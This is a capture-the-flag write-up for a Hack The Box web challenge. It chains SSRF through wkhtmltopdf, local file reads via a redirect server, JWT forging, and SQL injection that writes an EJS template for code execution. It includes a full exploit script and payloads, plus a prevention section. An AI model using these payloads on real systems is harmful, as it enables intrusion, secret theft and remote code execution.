# Blueprint Heist - COMPLETE SOLUTION

## The Vulnerability Chain

This challenge requires chaining **4 different vulnerabilities**:

1. **SSRF via wkhtmltopdf** - Access internal services
2. **HTTP Redirect LFI** - Read local files via redirect
3. **SQL Injection with Regex Bypass** - Write malicious files
4. **EJS Template Injection** - Execute arbitrary code

---

## Step-by-Step Exploitation

### Step 1: Setup HTTP Redirect Server

Create `redirect.php` on a **publicly accessible** server:

```php
<?php
header('Location: file://' . $_GET['file']);
?>
```

Host this on your server (use ngrok, VPS, or any public hosting):
```bash
php -S 0.0.0.0:8000
ngrok http 8000  # Get public URL
```

### Step 2: Read `.env` File to Get JWT Secret

```bash
# Get guest token
GUEST_TOKEN=$(curl -s http://target:port/getToken)

# Read .env via HTTP redirect
curl -X POST "http://target:port/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://YOUR_PUBLIC_SERVER/redirect.php?file=/app/.env"}' \
  --output env.pdf

# Extract text from PDF
pdftotext env.pdf -
```

**Result:**
```
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=D4T4b4s3Secr3tP4ssw0rd1ss0L0ngOmG!
DB_NAME=construction
DB_PORT=3306
secret=IM_Sup3r_K3y_pl3ase_b3_c4r3ful?
```

### Step 3: Forge Admin JWT Token

Use the secret to create an admin token:

```python
import jwt

secret = "IM_Sup3r_K3y_pl3ase_b3_c4r3ful?"
payload = {"role": "admin"}
admin_token = jwt.encode(payload, secret, algorithm="HS256")
print(admin_token)
```

Or use https://jwt.io:
- Paste guest token
- Change payload: `{"role": "admin"}`
- Set secret: `IM_Sup3r_K3y_pl3ase_b3_c4r3ful?`
- Copy the new token

### Step 4: Verify GraphQL Access via SSRF

Test GraphQL endpoint from localhost:

```bash
# This won't work directly from external
curl "http://target:port/graphql?token=$ADMIN_TOKEN"
# Returns: 403 Only available for internal users!

# But works via SSRF:
curl -X POST "http://target:port/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://127.0.0.1:1337/graphql?token=$ADMIN_TOKEN\"}" \
  --output graphql_test.pdf
```

### Step 5: Exploit SQL Injection with Newline Bypass

The regex `/^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/` blocks special chars...
**BUT** it doesn't match characters AFTER a newline (`\n`)!

**Payload Structure:**
```
safe_chars\n%' UNION SELECT 1,2,3 INTO OUTFILE '/app/views/errors/404.ejs' -- -
```

The regex only checks the first line, so everything after `\n` is ignored!

### Step 6: Write Malicious EJS Template

Create the malicious GraphQL query:

```graphql
{
  getDataByName(name: "test\n%' UNION SELECT 1,2,3 INTO OUTFILE '/app/views/errors/404.ejs' -- -") {
    name
    department
    isPresent
  }
}
```

**But we need to write EJS code!** The payload should be:

```
test
%' UNION SELECT 1,'<%= global.process.mainModule.require(\"child_process\").execSync(\"/readflag\") %>',3 INTO OUTFILE '/app/views/errors/404.ejs' -- -
```

**URL-encode the GraphQL query:**

```bash
ADMIN_TOKEN="your_admin_token"
PAYLOAD='test%0A%25%27%20UNION%20SELECT%201%2C%27%3C%25%3D%20global.process.mainModule.require(%22child_process%22).execSync(%22%2Freadflag%22)%20%25%3E%27%2C3%20INTO%20OUTFILE%20%27%2Fapp%2Fviews%2Ferrors%2F404.ejs%27%20--%20-'

# Execute via SSRF
curl -X POST "http://target:port/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://127.0.0.1:1337/graphql?token=$ADMIN_TOKEN&query={getDataByName(name:\\\"$PAYLOAD\\\"){name}}\"}" \
  --output inject.pdf
```

### Step 7: Trigger the Malicious Template

Access any non-existent route to trigger 404 error:

```bash
curl "http://target:port/nonexistent"
```

The custom error handler will:
1. Look for `404.ejs` template
2. Find our malicious template
3. Execute the EJS code
4. Run `/readflag`
5. Return the flag!

---

## Complete Exploit Script

```bash
#!/bin/bash

TARGET="94.237.59.225:55358"
REDIRECT_SERVER="YOUR_NGROK_URL"  # e.g., https://abc123.ngrok.io

echo "[+] Getting guest token..."
GUEST_TOKEN=$(curl -s http://$TARGET/getToken)

echo "[+] Reading .env via HTTP redirect..."
curl -X POST "http://$TARGET/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"$REDIRECT_SERVER/redirect.php?file=/app/.env\"}" \
  --output env.pdf

echo "[+] Extracting JWT secret..."
SECRET=$(pdftotext env.pdf - | grep "secret=" | cut -d'=' -f2)
echo "Secret: $SECRET"

echo "[+] Forging admin token..."
ADMIN_TOKEN=$(python3 -c "import jwt; print(jwt.encode({'role':'admin'}, '$SECRET', algorithm='HS256'))")
echo "Admin token: $ADMIN_TOKEN"

echo "[+] Injecting malicious EJS template..."
PAYLOAD="test%0A%25%27%20UNION%20SELECT%201%2C%27%3C%25%3D%20global.process.mainModule.require(%22child_process%22).execSync(%22%2Freadflag%22)%20%25%3E%27%2C3%20INTO%20OUTFILE%20%27%2Fapp%2Fviews%2Ferrors%2F404.ejs%27%20--%20-"

curl -X POST "http://$TARGET/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://127.0.0.1:1337/graphql?token=$ADMIN_TOKEN&query={getDataByName(name:\\\"$PAYLOAD\\\"){name}}\"}" \
  --output inject.pdf

echo "[+] Triggering malicious template..."
curl -s "http://$TARGET/nonexistent"

echo "[+] Done! Flag should appear above."
```

---

## Key Insights

### 1. Why HTTP Redirect?
- wkhtmltopdf follows HTTP 302 redirects
- A redirect to `file://` allows reading local files
- Direct `file://` URLs might be blocked, but redirects bypass this

### 2. Why Newline Bypass Works?
The regex uses `.` which matches any character **except newline**:
```javascript
/^.*[!#$%^&*()...]/
//   ^  This only matches up to the first newline!
```

### 3. Why Write to 404.ejs?
- The error handler looks for templates like `400.ejs`, `404.ejs`, etc.
- `404.ejs` doesn't exist initially
- We can create it via SQL injection `INTO OUTFILE`
- When triggered, EJS executes our code

### 4. EJS Code Execution
EJS templates allow JavaScript execution:
```ejs
<%= JAVASCRIPT_CODE %>
```

We use:
```ejs
<%= global.process.mainModule.require("child_process").execSync("/readflag") %>
```

This executes the SUID `/readflag` binary and outputs the flag!

---

## Alternative: Manual Steps

If you don't have a public server:

1. **Use a free service:**
   - webhook.site (may not support PHP)
   - beeceptor.com (custom responses)
   - requestbin.com
   
2. **Create HTML with redirect:**
   ```html
   <meta http-equiv="refresh" content="0;url=file:///app/.env">
   ```
   Host this HTML and use its URL

3. **Use cloud functions:**
   - AWS Lambda
   - Google Cloud Functions
   - Cloudflare Workers
   
   Create a function that returns 302 redirect to `file://` URLs

---

## Why This Challenge is "Easy"

1. All source code is provided
2. Clear vulnerability chain
3. Well-known techniques
4. No complex exploitation

The difficulty comes from:
- Understanding the attack chain
- Setting up the HTTP redirect server
- Properly encoding the SQL payload
- Knowing EJS template injection

---

## Prevention

1. **Sanitize HTML input:** Don't pass user-controlled URLs to wkhtmltopdf
2. **Disable file:// protocol:** Use `--disable-local-file-access`
3. **Use parameterized queries:** Never interpolate user input into SQL
4. **Validate redirects:** Don't follow redirects to file:// URLs
5. **Template security:** Don't allow user-controlled template creation
6. **Regex security:** Be careful with `.` in regex - it doesn't match newlines!

---

## Tools Needed

- curl / wget
- Python with PyJWT library
- pdftotext (poppler-utils)
- PHP (for redirect server)
- ngrok or similar tunneling tool

---

## Flag Format

```
HTB{...flag_content...}
```

The flag will be output when you successfully trigger the 404 error!

---

## Summary

This challenge teaches:
✅ SSRF exploitation techniques
✅ HTTP redirect abuse for LFI
✅ Regex bypass with newlines
✅ SQL injection file write
✅ Template injection (EJS)
✅ Chaining multiple vulnerabilities
✅ SUID binary exploitation concepts

The complete chain: **SSRF → LFI → JWT Forge → SQLi → Template Injection → RCE → Flag!**
